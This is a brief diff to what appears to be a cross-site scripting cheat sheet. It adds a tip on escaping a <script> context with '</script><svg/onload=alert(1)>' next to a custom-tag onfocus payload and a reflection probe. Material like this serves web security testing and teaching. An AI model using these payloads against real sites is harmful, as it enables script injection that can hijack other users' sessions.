@@ -16,4 +16,7 @@ Try url/?testtest // check in source for testtest
 
 // Custom HTML tag
 <xssdemo id=testxss onfocus=alert(1) tabindex=1>#testxss
+
+If reflected between <script> [...] </script> tags, even if your input if inside any kind of quotes, you can try to inject </script> and escape from this context. then </script><svg/onload=alert(1)>
+
 ```
